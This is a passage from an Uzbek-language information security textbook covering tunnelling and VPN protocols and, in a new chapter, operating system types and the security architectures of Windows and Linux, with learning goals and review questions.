Tunellash turli darajada ishlashi mumkin. Masalan, ma’lumotni faqat bitta segmentdan o‘tkazish, ikki tarmoqni bog‘lash yoki butun aloqani himoyalangan kanalga aylantirish mumkin. Ba’zi tunellar shifrlashni talab qilmaydi, lekin aksariyat zamonaviy tizimlarda tunellash shifrlash bilan birgalikda qo‘llanib, kuchli xavfsizlik muhitini yaratadi. Aynan shu sababdan tunellash ko‘pincha VPN texnologiyalarining asosiy elementi sifatida qaraladi.
Tunellash shuningdek trafikni inkapsulyatsiyalash (encapsulation), manzillarni yashirish, yoki tarmoq strukturasini tashqi tomonga ko‘rsatmaslik kabi qo‘shimcha afzalliklarni ham beradi. Bu esa ichki tarmoqni himoyalash, cheklangan xizmatlardan foydalanishni boshqarish va internet orqali ishonchli ulanishlarni tashkil etishda muhim rol o‘ynaydi.
VPN vositasi va uning asosiy maqsadi 
Virtual xususiy tarmoq (Virtual Private Network, VPN) deganda ma’lumotlarni inkapsulyatsiyalash mexanizmlari, hamda qo‘shimcha autentifikatsiya, shifrlash, yaxlitlikni nazoratlash bazasida vaqtinchalik himoyalangan aloqa kanalini yaratish yo‘li bilan uzatiluvchi ma’lumotlarni himoyalash vositasi tushuniladi. Nomidan ko‘rinib turibdiki, VPNning asosiy g‘oyasi vaqtinchalik (seans davrida) ma’lumotlarni uzatish uchun inkapsulyatsiyalash, ya’ni bir sathning tarmoq paketini yuqori sathning yagona paketiga birlashtirish yo‘li bilan himoyalangan tunnelni yaratishdan iborat. Aynan, doimiy himoyalangan kanalni yoki ajratilgan liniyani ijaraga olishni tashkil etish oldida, vaqtinchalik tunnelni tashkil etish imkoniyatining afzalligi namoyon.
Ma’lumotlar paketining yuqori sath paketiga inkapsulyatsiyasi esa ma’lumotlarni shifrlash va ularning yaxlitligini nazoratlash talablarini osongina qondirishga imkon beradi. 
Virtual xususiy tarmoqlarni, asosan OSI-modeli sathlari va ulanish usullari bo‘yicha tasniflash qabul qilingan. Ulanish bo‘yicha “nuqta-nuqta” (“uzel-uzel”), “nuqta-tarmoq” va “tarmoq-nuqta” usullari farqlanadi. 2.2-jadvalda virtual xususiy tarmoqning eng ommaviy protokollari keltirilgan.
2.2-jadval
Virtual xususiy tarmoq protokollari
OSI modeli sathlari
Tunnellashning bazaviy protokoli
Shifrlash vositalari
Seans sathi
SOCKS
Quyidagi protokollardan foydalanadi.
Transport sathi
SSH
AES, 3DES, Blowfish

SSL/TLS
AES, 3DES, IDEA, RC4 va h.
Tarmoq sathi
IPSec (ESP)
AES, 3DES va h.
Kanal sathi
L2TP
Yuqoridagi protokollardan foydalanadi.

PPTP
MPPE (RC4)
PPTP (Point-to-Point Tunneling Protocol) – “nuqta-nuqta” xilidagi kanal sathining tunnel protokoli. Ushbu protokol, tunnelga xizmat qilish uchun, qo‘shimcha TCP-ulanish yordamida PPP-kadrlarni IP-paketlarga inkapsulyatsiyalaydi. Mijozlarni autentifikatsiyalash uchun masofaviy foydalanishning turli protokollarini, jumladan MSCHAPv2 protokolini, madadlaydi. Shifrlashda RC4 algoritmni amalga oshiruvchi MPPE protokol madadlanadi. 
L2TP (Layer 2 Tunneling Protocol) – PPP-kadrlarni tarmoq sathi paketlariga inkapsulyatsiyalovchi kanal sathining tunellash protokoli. Protokolning afzalligi sifatida foydalanish ustuvorliklarini va multiprotokollikni (nazariy jihatdan IPga bog‘liq emaslikni) madadlashini ko‘rsatish mumkin. Shifrlash mexanizmi o‘zidan yuqori sathga ishonib topshiriladi, masalan IPSec apparat yordamida amalga oshirilishi mumkin. PPTPdan farqli holda, TCP/IP tarmoqlarida ushbu protokol transport protokoli UDPga moslangan. 
IPSec (IP Security) protokoli ikkita rejimda – transport va tunel rejimida ishlaydi. Transport rejimida (ushbu rejim hostlar orasidagi ulanishlarni o‘rnatishda ishlatiladi) IPSecdan, qandaydir boshqa usul, xususan, shifrlash funksiyasi bo‘lmagan L2TP tomonidan tashkil etilgan “nuqta-nuqta” xilidagi tunellarni himoyalashda foydalanish mumkin. Tunel rejimi shunday tunelarni yaratishga imkon beradiki, shifrlangan butun paket (transport rejimidan farqli holda, butun paket sarlavhasi bilan shifrlangan) manzilga yetkazish uchun yuqori sathga inkapsulyatsiyalanadi.
VPN vositalarining tasnifi
VPN texnologiyalari qo‘llanilishi, xavfsizlik darajasi va tarmoq arxitekturasiga qarab bir nechta asosiy turlarga bo‘linadi. Ularga masofadan foydalanish uchun VPN (Remote Access VPN), tomonlar o‘rtasidagi VPN (Site-to-Site VPN), Mijozga asoslangan VPN (Client-Based VPN), Mijozsiz VPN (Clientless VPN) va korporativ xavfsizlikka yo‘naltirilgan IPsec yoki SSL/TLS asosidagi VPNlardir.
Remote Access VPN masofaviy foydalanuvchilarning korporativ resurslarga shifrlangan kanal orqali ulanishini ta’minlaydi. U odatda xodimlar, IT mutaxassislari yoki mobil foydalanuvchilar tomonidan foydalaniladi. Bu turda autentifikatsiya, shifrlash va trafikni izolatsiyalash asosiy ahamiyat kasb etadi.
Site-to-Site VPN esa ikki yoki undan ortiq filial tarmoqlarini yagona virtual infratuzilmaga birlashtiradi. Korxona ichidagi bo‘limlar yoki geografik jihatdan ajratilgan ofislar o‘zaro xavfsiz muloqot qilishi mumkin bo‘ladi. Bu turdagi VPNlar odatda IPSec yordamida amalga oshiriladi va yuqori darajadagi barqarorlikni ta’minlaydi.
Mijozga asoslangan (Client-Based) VPN foydalanuvchi qurilmasiga maxsus mijoz dasturining o‘rnatilishini talab qiladi. Mijozsiz (Clientless) VPN esa brauzer orqali SSL/TLS asosida shifrlangan ulanishni yaratadi va qo‘shimcha dastur o‘rnatishni talab qilmaydi.
Zamonaviy amaliyotda OpenVPN, IKEv2/IPsec va WireGuard kabi protokollarga asoslangan VPN vositalari keng qo‘llaniladi. Ular yuqori xavfsizlik, barqarorlik va mobil moslashuvchanlikni ta’minlagani sababli korporativ tarmoqlarda keng qo‘llaniladi.
	IP tarmoq protokolining vazifasi va unda xavfsizlikni ta’minlash holati?
	•	IP protokolda yaxlitlik, konfidensiallik va autentifikatsiya masalasini ta’minlash holati haqida ayting?
	•	Shifrlash nima va undan asosiy maqsad nima?
	•	Tunellash nima va undan asosiy maqsad nima?
	•	VPN vositasi va uning asosiy maqsadini ayting?
	•	VPN vositasi qanday protokollar asosida quriladi?
	•	VPN vositalarining turlari haqida ma’lumot bering?
Nazorat savollari

	•	IP tarmoq protokolining vazifasi va unda xavfsizlikni ta’minlash holati?
	•	IP protokolda yaxlitlik, konfidensiallik va autentifikatsiya masalasini ta’minlash holati haqida ayting?
	•	Shifrlash nima va undan asosiy maqsad nima?
	•	Tunellash nima va undan asosiy maqsad nima?
	•	VPN vositasi va uning asosiy maqsadini ayting?
	•	VPN vositasi qanday protokollar asosida quriladi?
	•	VPN vositalarining turlari haqida ma’lumot bering?
Nazorat savollari

III BOB. OPERATSION TIZIMLAR VA FAYL XAVFSIZLIGI


III BOB. OPERATSION TIZIMLAR VA FAYL XAVFSIZLIGI







Ta’lim maqsadlari:
	•	Windows va Linux operatsion tizimlari xavfsizlik arxitekturasini (foydalanuvchilar, ruxsatlar, imtiyozlar) taqqoslaydi va izohlaydi;
	•	Linux terminalida asosiy buyruqlar yordamida fayl tizimidan bemalol foydalana oladi va katalog tuzilmasini tushuntiradi;
	•	Fayl tizimlari, egalik va foydalanish huquqlari tushunchalarini misollar orqali tushuntiradi;
	•	chmod va chown buyruqlari yordamida fayl va katalog ruxsatlarini mustaqil boshqaradi;
	•	foydalanuvchi akkauntlari va parol siyosati tushunchalarini tahlil qiladi hamda imtiyozlarni ajratishning xavfsizlikdagi rolini asoslaydi;
	•	operatsion tizimda foydalanuvchilarni yaratadi, o‘chiradi va sozlaydi, parol murakkabligi talablarini amaliyotda qo‘llaydi;
	•	tizim jurnallari (loglar)ning xavfsizlik hodisalarini aniqlashdagi ahamiyatini tushuntiradi va ularni tahlil qiladi;
	•	Event Viewer va journalctl yordamida g‘ayrioddiy faoliyat va potentsial buzilish belgilarini aniqlaydi;
	•	fayllarni shifrlash, Secure Boot va tizim yangilanishlari asosida operatsion tizim xavfsizligini oshirish bo‘yicha kompleks himoya choralarini ishlab chiqadi.
Bobni o'zlashtirish uchun tavsiya etiladigan qo'shimcha kurslar:
1. Operatsion tizimlar: Kirish, ma’murlash va xavfsizlik (Операционные системы: Обзор, администрирование и безопасность) -  https://www.coursera.org/learn/operating-systems-overview-administration-security
2. O‘rnatish, foydalanuvchi akkauntlari va fayl tizimlari (Installation, User Accounts, and File Systems) - https://www.coursera.org/learn/packt-installation-user-accounts-and-file-systems-g5zwm#modules 
3-bob haqida umumiy ma’lumot
Mazkur bobda operatsion tizim tushunchasi, Windows/Linux OT xavfsizlik mexanizmlari, fayl tizimlari, foydalanuvchi turlari, guruhlar, operatsion tizimning hodisalarni qaydlash jurnallari, ular asosida tahdidlarni aniqlash, Windows OT da foydalanuvchilarni yaratish, o‘chirish, ular uchun parollar siyosatini o‘rnatish kabi masalalar nazariy va amaliy jihatidan tushuntiriladi.









3.1. Windows vs Linux xavfsizligi  (Ma’ruza mashg‘uloti)

1. Operatsion tizimlar (OT) haqida umumiy tushuncha. 
2. Operatsion tizimlarning turlari.
3. Windows/ Linux OTlarining xavfsizlik arxitekturasi va imtiyozlar.
Reja:
1. Operatsion tizimlar (OT) haqida umumiy tushuncha. 
2. Operatsion tizimlarning turlari.
3. Windows/ Linux OTlarining xavfsizlik arxitekturasi va imtiyozlar.
Reja:

Operatsion tizim, jarayon, Windows, Linux, macOS, UNIX, Android, xavfsizlik mexanizmlari, autentifikatsiya, parollar siyosati, fayl tizimlari, tarmoq xavfsizligi, ajratish mexanizmi.
Kalit so‘zlar:
Operatsion tizim, jarayon, Windows, Linux, macOS, UNIX, Android, xavfsizlik mexanizmlari, autentifikatsiya, parollar siyosati, fayl tizimlari, tarmoq xavfsizligi, ajratish mexanizmi.
Kalit so‘zlar:
Operatsion tizimlar (OT) haqida umumiy tushuncha
Operatsion tizim (OT) - bu kompyuter foydalanuvchisi va kompyuter texnikasi o‘rtasidagi interfeys. Operatsion tizim - bu fayllarni boshqarish, xotirani boshqarish, jarayonni boshqarish, kirish va chiqish bilan ishlash va ma’lumotlarni saqlash (disk) vositalari va printerlar kabi qo‘shimcha qurilmalarni boshqarish kabi barcha asosiy vazifalarni bajaradigan dasturiy ta’minot.
Umuman olganda, kompyuter tizimi quyidagi tarkibiy qismlardan iborat  (3.1-rasm):
Kompyuter foydalanuvchilari - bu umumiy kompyuter tizimidan foydalanadigan foydalanuvchilar.
Amaliy dasturiy ta’minot - bu foydalanuvchilar turli xil faoliyatni amalga oshirish uchun bevosita foydalanadigan dasturlar. Brauzerlar, Word, Excel, turli tahrirlash vositalari, o‘yinlar va boshqalar kabi oddiy va ulardan foydalanish oson. Ular odatda Python, Java va C++ kabi yuqori darajadagi tillarda yoziladi.
Tizim dasturiy ta’minotlari tabiatan murakkabroq bo‘lgan va ular kompyuter texnikasiga yaqinroq bo‘lgan dasturlardir. Ushbu dasturlar odatda assambler tili kabi past darajadagi tillarda yoziladi va operatsion tizimlarni (Microsoft Windows, macOS va Linux), Kompilyator va Assembler va boshqalarni o‘z ichiga oladi.
Kompyuter qurilmasiga monitor, klaviatura, protsessor, disklar, xotira va boshqalar kiradi.

3.1-rasm. Kompyuter tizimining konseptual ko‘rinishi
Har bir kompyuterda boshqa dasturlarni ishga tushirish uchun operatsion tizim bo‘lishi kerak. Operatsion tizim turli xil tizim dasturlari va turli foydalanuvchilar uchun amaliy dasturlar o‘rtasida apparatdan foydalanishni muvofiqlashtiradi. Bu shunchaki boshqa dasturlar foydali ishlarni bajarishi mumkin bo‘lgan muhitni ta’minlaydi.
Operatsion tizim - bu kompyuter tizimida ishlaydigan, uning to‘g‘ri ishlashini ta’minlaydigan maxsus dasturlar to‘plami. U klaviaturadan kiritilgan ma’lumotlarni tanib olish, diskdagi fayllar va kataloglarni kuzatish, displey ekraniga chiqishni jo‘natish va qo‘shimcha qurilmalarni boshqarish kabi asosiy vazifalarni bajaradi. 3.2-rasmda operatsion tizimning sathga asoslangan loyihasi keltirilgan.

3.2-rasm. Operatsion tizimning sathga asoslangan loyihasi
Kengaytirilgan mashina kontekstni saqlash, jo‘natish, almashtirish va kiritish-chiqarishni boshlash kabi operatsiyalarni amalga oshiradi. Operatsion tizim sathi kengaytirilgan mashina qatlamining tepasida joylashgan. Ushbu tartib funktsiya algoritmini uning dastlabki operatsiyalarini amalga oshirishdan ajratish orqali OT modullarini kodlash va sinovdan o‘tkazishni sezilarli darajada osonlashtiradi. Endi OT modulini sinash, debaggerlash va o‘zgartirish monolit OTga qaraganda osonroq. Pastki qatlam kengaytirilgan mashina bo‘lgan abstraktsiyani ta’minlaydi. Operatsion tizim qatlami OTning yuqori qatlami deb ataladi.
OTlarning turlari
OT turli ehtiyoj va holatlarga mos ravishda farqlanadi; ba’zilari bitta vazifani ketma-ket bajaradi, boshqalari esa bir nechta foydalanuvchi yoki real-vaqt rejimida ishlovchi holatlarni qo‘llab-quvvatlaydi. Quyida eng keng tarqalgan OT turlari va ularning asosiy xususiyatlari keltirilgan (3.3-rasm).
	•	Umumfoydalaniluvchi operatsion tizimlar
Windows OT: Microsoft tomonidan ishlab chiqilgan Windows operatsion tizimi dunyodagi eng mashhur tizimlardan biridir. U qulay foydalanuvchi interfeysi, keng dasturiy ta’minot mosligi va keng qamrovli apparat qo‘llab-quvvatlashiga ega. Windows turli versiyalarda taqdim etiladi, ulardan eng yangisi Windows 11 hisoblanadi. U desktop va noutbuklarda foydalanish bo‘yicha yetakchilik qilib, turli xil ilovalar uchun juda moslashuvchan platformani taklif etadi.
macOS: Apple Inc. tomonidan ishlab chiqilgan macOS - faqat Apple kompyuterlarida ishlatiladigan operatsion tizimdir. O‘zining chiroyli dizayni, Apple ekotizimi bilan mukammal integratsiyasi va kuchli xavfsizlik xususiyatlari bilan mashxur. macOS oson va qulay foydalanuvchi interfeysini ta’minlaydi. U kuchli dasturiy vositalar to‘plamiga ega bo‘lib, dizayn va multimedia sanoati mutaxassislari tomonidan keng qo‘llaniladi.
Linux: Linux — ochiq kodli operatsion tizim bo‘lib, yuqori darajada moslashtiriladigan va moslashuvchan muhitga ega. U turli distributrlarda (maqsadlarda) mavjud bo‘lib, har biri ma’lum foydalanuvchi ehtiyojlari va talablariga moslashtirilgan. Linuxning mashhur distributrlariga Ubuntu, Fedora, Debian va boshqalar kiradi. U o‘zining barqarorligi, xavfsizligi va ishonchliligi bilan tanilgan va dunyo bo‘yicha ko‘plab serverlar hamda o‘rnatilgan tizimlar aynan Linuxda ishlaydi.
Unix: Unix - 1970-yillarda ishlab chiqilgan juda barqaror va xavfsiz operatsion tizimdir. U ko‘p foydalanuvchili va ko‘p vazifali (multitasking) modelga ega bo‘lib, serverlar va yuqori samarali hisoblash tizimlari uchun ideal hisoblanadi. Unix Oning iyerarxik fayl tizimi va buyruq satri interfeysi samarali fayl boshqaruvi va kuchli buyruq vositalarini taqdim etadi. U tarmoqli funksiyalarni qo‘llab-quvvatlaydi, bu esa tizimlar o‘rtasida samarali muloqotni ta’minlaydi. Ochiq manba xususiyati tufayli Unix OT keng dasturiy ta’minot ekotizimiga ega, jumladan dasturlash tillari va ishlab chiqish vositalari bilan boy. Umuman olganda, Unix OTning barqarorligi, xavfsizligi, moslashuvchanligi va keng dasturiy qo‘llab-quvvatlashi uni keng qo‘llaniladigan va doimiy rivojlanib boruvchi tizimga aylantirgan.




3.3-rasm. Operatsion tizim logotiplari
2. Mobil operatsion tizimlar
Mobil OTlar - smartfon, planshet va boshqa mobil qurilmalar uchun mo‘ljallangan operatsion tizimlardir. Ular qurilmaning apparat resurslarini boshqaradi, ilovalar uchun muhit yaratadi va foydalanuvchilarga qulay interfeys taqdim etadi (3.4-rasm). 
Afzalliklari:
	•	Foydalanuvchiga qulay interfeyslar: mobil operatsion tizimlar intuitiv va oson foydalanishga mo‘ljallangan bo‘lib, juda keng doiradagi foydalanuvchilar uchun qulay hisoblanadi.
	•	Keng ilovalar ekotizimi: minglab ilovalarning mavjudligi foydalanuvchilarga o‘z qurilmalarini shaxsiy ehtiyojlariga mos ravishda sozlash imkonini beradi.
	•	Keng ulanish imkoniyatlari: mobil OTlar bir nechta ulanish texnologiyalarini qo‘llab-quvvatlaydi, bu esa foydalanuvchilarga istalgan joyda bog‘lanib qolish imkonini yaratadi.
Kamchiliklari:
	•	Batareya quvvatining cheklanganligi: quvvatni boshqarish texnologiyalari rivojlanayotganiga qaramay, og‘ir yuklama ostida mobil qurilmalar batareyasi tez tugashi mumkin.
	•	Xavfsizlik muammolari: mobil qurilmalar zararli dasturlar, fishing hujumlari kabi tahdidlarga moyil bo‘lib, foydalanuvchi ma’lumotlari xavf ostida qolishi mumkin.
	•	Fragmentatsiya: ayniqsa Android tizimida qurilmalar sonining ko‘pligi va ishlab chiqaruvchilar kiritadigan o‘zgarishlar sababli fragmentatsiya yuzaga keladi, bu esa ishlab chiquvchilar uchun barcha qurilmalar bilan moslikni ta’minlashni qiyinlashtiradi.
Mobil OTlarga Android, iOS, eski BlackBerry OSlarini misol keltirish mumkin.




3.4-rasm. Mobil operatsion tizim logotiplari
Windows/ Linux OTlarining xavfsizlik arxitekturasi va imtiyozlar
Windows OT xavfsizligi. Windows operatsion tizimi zamonaviy kompyuter muhitida keng qo‘llaniladigan, funksional imkoniyatlari boy va xavfsizlik talablariga javob beradigan murakkab dasturiy platforma hisoblanadi. Tizimning xavfsizlik arxitekturasi bir-biri bilan chambarchas bog‘langan, ko‘p qatlamli mexanizmlardan tashkil topgan bo‘lib, foydalanuvchilarni, ma’lumotlarni, ilovalarni va tarmoq infratuzilmasini himoya qilishni maqsad qiladi. Ushbu bo‘limda Windows xavfsizlik arxitekturasining asosiy komponentlari, ularning vazifalari va o‘zaro ishlash ketma-ketliklari yoritadi.
Xavfsizlik monitori (Security Reference Monitor, SRM)
SRM Windows yadrosining muhim xavfsizlik komponenti bo‘lib, tizimdagi barcha obyektlardan foydalanishni nazorat qiladi. SRM foydalanuvchining foydalanish huquqlarini foydalanish tokeni (Access Token, AT) bilan solishtiradi, xavfsizlik siyosatlariga rioya etilishini ta’minlaydi va zarur hollarda audit yozuvlarini shakllantiradi. Ushbu modulning asosiy vazifasi - tizim resurslari ustidan ruxsatlarni qat’iy boshqarish hamda har qanday foydalanish jarayonining xavfsizlik qoidalariga muvofiqligini tasdiqlashdir.
Lokal xavfsizlik markazi qismtizim xizmati (Local Security Authority Subsystem Service, LSASS)
LSASS tizimda autentifikatsiya jarayonlarini boshqaradigan markaziy komponentdir. U foydalanuvchilarni tizimga kirishini amalga oshirish, parollarni tekshirish, Kerberos yoki NTLM kabi protokollar asosida autentifikatsiyalash kabi funksiyalarni bajaradi. LSASS tomonidan yaratiladigan AT foydalanuvchining barcha jarayonlar bo‘yicha ruxsat darajasini belgilaydi. Shuningdek, ushbu modul lokal xavfsizlik siyosatlarini qo‘llab-quvvatlaydi va audit faoliyatini yuritadi. Windows tizimida LSASS jarayoni muhimligi sababli unga zarar yetishi operatsion tizimning izdan chiqishiga olib keladi.
AT konsepsiyasi
AT Windows OT xavfsizlik modelining asosiy xususiyatlaridan biridir. Foydalanuvchi tizimga muvaffaqiyatli autentifikatsiya qilingandan so‘ng LSASS tomonidan yaratiladigan token foydalanuvchi xavfsizlik identifikatori (Security Identifiers, SID), guruh identifikatorlari, maxsus vakolatlar (privileges) va foydalanuvchi qayd yozuvini nazoratlash (User Account Control, UAC) darajalarini o‘z ichiga oladi. Tizimdagi barcha jarayonlar va ilovalarning resurslarga bo‘lgan murojaatlari ushbu token orqali tekshiriladi. Shu tariqa Windows OT foydalanuvchi huquqlarini markazlashtirilgan holda boshqaradi.
Foydalanuvchi qayd yozuvini nazoratlash (User Account Control, UAC)
Foydalanuvchi qayd yozuvini nazoratlash - tizimdagi xavfsizlikni oshirish uchun joriy etilgan mexanizm bo‘lib, foydalanuvchi vakolatlarini aniq chegaralaydi. UAC orqali administrator vakolatiga ega bo‘lmagan foydalanuvchilar tizim fayllarida yoki konfiguratsiyalarida o‘zgarish kiritmoqchi bo‘lsa, maxsus tasdiqlash oynasi paydo bo‘ladi. Ushbu mexanizm vakolat oshirishga qaratilgan hujumlarni kamaytiradi, tizimning yaxlitligini saqlaydi va amalga oshirilishdagi (ekspluatatsiya) xatoliklaridan himoya qiladi.
Windows himoya (Windows Defender) xavfsizlik platformasi
Windows Defender - Windows operatsion tizimiga integratsiyalashgan zamonaviy xavfsizlik paketi bo‘lib, real vaqt rejimida zararli dasturlardan himoya qiladi. U antivirus, o‘zgarishlarga nisbatan himoya, zaifliklarga qarshi mexanizmlar (Exploit Guard), tarmoq filtrlari va virtualizatsiyaga asoslangan mexanizmlarni (Credential Guard) o‘z ichiga oladi. Credential Guard foydalanuvchi parollari va autentifikatsiya ma’lumotlarini maxsus himoyalangan virtual muhitda saqlash orqali ularni o‘g‘irlashga qaratilgan hujumlarning oldini oladi.
Aktiv katalog (Active Directory, AD) muhitida xavfsizlik
Korxona muhitlarida Windows operatsion tizimi ko‘pincha Active Directory yordamida markazlashtirilgan boshqaruv asosida ishlaydi. AD tizimi foydalanuvchilarni identifikatsiyalash, autentifikatsiya jarayonlarini markazlashtirish va xavfsizlik siyosatlarini guruh siyosati (Group Policy) orqali boshqarish imkoniyatini beradi. Kerberos protokoliga tayanadigan autentifikatsiya tizimi yuqori darajadagi xavfsizlik hamda resurslardan nazoratli foydalanish imkoniyatini ta’minlaydi.
NTFS fayl tizimining xavfsizlik modeli
Windowsda qo‘llaniladigan NTFS (New Technology File System) fayl tizimi kengaytirilgan xavfsizlik xususiyatlariga ega. Fayl va papkalardan foydalanish huquqlari DACL (Discretionary Access Control List) orqali boshqariladi, audit yozuvlari esa SACL (System Access Control List) orqali yuritiladi. NTFS, shuningdek, EFS (Encrypting File System) texnologiyasi yordamida fayllarni shifrlangan ko‘rinishda saqlashga imkon beradi.
Windows tarmoqlararo ekran (Firewall) vositasi va tarmoq himoyasi
Windows Firewall tizimning tarmoq xavfsizligini ta’minlashda muhim rol o‘ynaydi. U kiruvchi va chiquvchi trafikni filtrlash, portlar va protokollarni boshqarish, IPSec bilan integratsiya qilish kabi imkoniyatlarga ega. Profilga mos ravishda (Private, Public, Domain) xavfsizlik qoidalari avtomatik tarzda qo‘llaniladi, bu esa turli tarmoq muhitlarida moslashuvchan himoyani ta’minlaydi.
Izolyatsiya va qumli quti (sandbox) mexanizmlari
Windows ilovalarni alohida, xavfsiz muhitda ishga tushirish uchun turli izolyatsiya texnologiyalaridan foydalanadi. AppContainer, Windows Sandbox, jarayonlar izolyatsiyasi, xotira himoyasi (ASLR, DEP, CFG) kabi mexanizmlar zararli kodning tizimga zarar yetkazish ehtimolini kamaytiradi. Ushbu mexanizmlar yuqori xavfli dasturlarni yoki noma’lum kodlarni sinovdan o‘tkazishda xavfsizlikni oshiradi.
Audit va monitoring tizimi
Windows tizimi xavfsizlik voqealarini kuzatish uchun keng audit mexanizmlariga ega. Login jarayonlari, ruxsat buzilishlari, tarmoq ulanishlari va ilovalar faoliyati haqida batafsil ma’lumot hodisalar monitori (Event Viewer) orqali to‘planadi. Ushbu mexanizm administratorlarga xavfsizlik tahdidlarini erta aniqlash va tizimning umumiy holatini nazorat qilish imkonini beradi.
Linux OT xavfsizligi.  Linux operatsion tizimi ochiq kodli, modulli va yuqori darajada moslashtiriladigan platforma bo‘lib, global miqyosda serverlar, bulut infratuzilmalari, superkompyuterlar, IoT qurilmalari va desktop tizimlarida keng qo‘llaniladi. Uning xavfsizlik arxitekturasi UNIX tamoyillariga asoslanib shakllangan bo‘lsada, zamonaviy xavfsizlik talablari asosida yanada boyitilgan. Linux OTning kuchli jihatlari ruxsatlar modeli, jarayon izolyatsiyasi, modulli yadro, mandatli foydalanishni boshqarish tizimlari va tarmoq xavfsizligi mexanizmlarida namoyon bo‘ladi.
1. Asosiy xavfsizlik modeli
Linux xavfsizlik arxitekturasi an’anaviy UNIX modeliga tayangan holda qurilgan bo‘lib, har bir resursdan foydalanish uchta subyekt asosida tartibga solinadi: foydalanuvchi (owner), guruh (group) va boshqa foydalanuvchilar (others). Har bir fayl va katalog uchun uch turdagi ruxsat belgilanadi: o‘qish (read), yozish (write) va bajarish (execute). Ushbu soddalik tizimning barqaror xavfsizlik poydevorini tashkil etadi.
Tizimdagi har bir foydalanuvchi UID (User ID) orqali, guruhlar esa GID (Group ID) orqali aniqlanadi. Foydalanuvchi ma’lumotlari /etc/passwd faylida, parollar esa shifrlangan ko‘rinishda /etc/shadow faylida saqlanadi. Bu mexanizm himoyalangan autentifikatsiya jarayonini ta’minlaydi.
2. Yadro darajasidagi xavfsizlik mexanizmlari
Linux yadrosi (kernel) xavfsizlikni ta’minlashda markaziy o‘rinni egallaydi. Uning asosiy imkoniyatlari quyidagilardan iborat:
2.1. Jarayonlarni izolyatsiya qilish
Har bir jarayon alohida virtual xotira maydonida ishlaydi, bu esa jarayonlarning bir-biriga aralashishini va zararli dastur kodining tizimga keng ta’sir o‘tkazishini cheklaydi.
2.2. Vakolatlarni bo‘lish (Capabilities)
An’anaviy root foydalanuvchisining cheksiz vakolatlari kichik, boshqariladigan vakolatlarga bo‘linadi. Bu dasturlarning minimal huquqlar bilan ishga tushishini ta’minlab, tizimni imtiyozni oshishi (privilege escalation) turidagi hujumlardan himoya qiladi.
2.3. Modul orqali xavfsizlik kengaytmalari
Linux Security Modules (LSM) arxitekturasi yadroga SELinux, AppArmor kabi xavfsizlik tizimlarini ulash imkonini beradi.
3. Majburiy foydalanishni boshqarish tizimlari
Zamonaviy Linux distributrlari an’anaviy diskret foydalanishlarni boshqarish (Discretionary access control, DAC) modelini mustahkamlash uchun mandatli foydalanish boshqarish (MAC) tizimlaridan foydalanadi.
3.1. SELinux
Security-Enhanced Linux (SELinux) - hatti-harakat siyosatlariga asoslangan kuchli xavfsizlik tizimi bo‘lib, har bir jarayon va resurs uchun qat’iy qoidalar belgilaydi. SELinux tizim resurslaridan foydalanishni to‘liq nazorat qiladi va zaifliklarga asoslangan hujumlarning oldini oladi. U hukumat va korporativ darajadagi tizimlarda keng qo‘llaniladi.
3.2. AppArmor
AppArmor SELinuxga o‘xshash bo‘lib, ilovalar uchun profil asosida foydalanish siyosatlarini belgilaydi. Konfiguratsiyasi yengil bo‘lganligi sababli Ubuntu va SUSE kabi distributsiyalarda keng tarqalgan.
3.3. Seccomp-bpf
Seccomp jarayon tomonidan bajarilishi mumkin bo‘lgan tizim murojaatlari (system calls) ro‘yxatini cheklaydi. Bu texnologiya konteyner xavfsizligida, jumladan Docker va Kubernetesda keng qo‘llaniladi.
4. Fayl tizimi xavfsizligi
Linuxda qo‘llaniladigan fayl tizimlari (Ext4, XFS, Btrfs) xavfsizlikni oshiruvchi bir qator funksiyalarga ega:
	•	ACL (Access Control Lists) – kengaytirilgan ruxsatlar modeli;
	•	Qaydlash – fayl buzilishining oldini olish;
	•	Shifrlash – fscrypt yoki LUKS orqali ma’lumotlarni himoyalash;
	•	To‘liq diskni shifrlash uchun dm-crypt + LUKS mexanizmi qo‘llaniladi. Bu ma’lumotlarning yo‘qotish, o‘g‘rilik yoki ruxsatsiz foydalanishdan himoyalanishini ta’minlaydi.
5. Tarmoq xavfsizligi
Linux kuchli tarmoq xavfsizlik arxitekturasiga ega bo‘lib, quyidagi vositalar orqali trafikni boshqaradi:
5.1. Netfilter va iptables/nftables
Bu tizimlar paketlarni filtrlash, NATni boshqarish va trafikni nazorat qilish imkonini beradi.

5.2. VPN va tunnellash texnologiyalari
Linux quyidagi xavfsiz tunnellash protokollarini keng qo‘llab-quvvatlaydi:
	•	OpenVPN;
	•	WireGuard;
	•	IPsec.
Tarmoq xavfsizligi tufayli Linux korporativ va server muhitlarida ishonchli OT sifatida tanilgan.
6. Audit va monitoring tizimi
Linuxda xavfsizlik hodisalarini kuzatish va tahlil qilish uchun qator vositalar mavjud:
	•	auditd – tizimda sodir bo‘lgan barcha xavfsizlik hodisalarini qayd etadi;
	•	systemd-journald/journalctl – tizim jurnallarini boshqaradi;
	•	psacct/acct – foydalanuvchi faoliyatini nazorat qiladi.
Ushbu mexanizmlar administratorlarga tizim holatini real vaqt rejimida kuzatish, hujumlarni aniqlash va muammolarga tezkor javob berish imkonini beradi.
7. Konteynrlashtirish xavfsizligi
Linux konteyner texnologiyalari (Docker, LXC, Podman) orqali ilovalarni yengil izolyatsiyada ishga tushirish imkonini beradi. Konteyner xavfsizligi quyidagi mexanizmlarga tayanadi:
7.1. Namespaces
Jarayonlarni PID, tarmoq, fayl tizimi, foydalanuvchi identifikatori va boshqa resurslar bo‘yicha izolyatsiya qiladi.
7.2. Guruhlarni boshqarish (Control Groups, cgroups)
Jarayonlar uchun CPU, xotira, disk IO va boshqa resurslardan foydalanishni cheklash imkonini beradi.
Linux operatsion tizimining xavfsizlik arxitekturasi soddalik va qat’iylikka asoslangan bo‘lishiga qaramay, zamonaviy xavfsizlik talablariga to‘liq mos keladi.
	OT nima va uning asosiy vazifalarini ayting?
	•	Kompyuter tizimining tarkibiy qismlari haqida ma’lumot bering?
	•	Operatsion tizimning sathga asoslangan ko‘rinishi haqida ma’lumot bering?
	•	Operatsion tizimlar turlari haqida ma’lumot bering?
	•	Mobil operatsion tizimlar haqida ma’lumot bering?
	•	Windows OT xavfsizligini ta’minlashga xizmat qiluvchi mexanizmlar haqida ayting?
	•	Linux OT xavfsizligini ta’minlashga xizmat qiluvchi mexanizmlar haqida ayting?

Nazorat savollari

	•	OT nima va uning asosiy vazifalarini ayting?
	•	Kompyuter tizimining tarkibiy qismlari haqida ma’lumot bering?
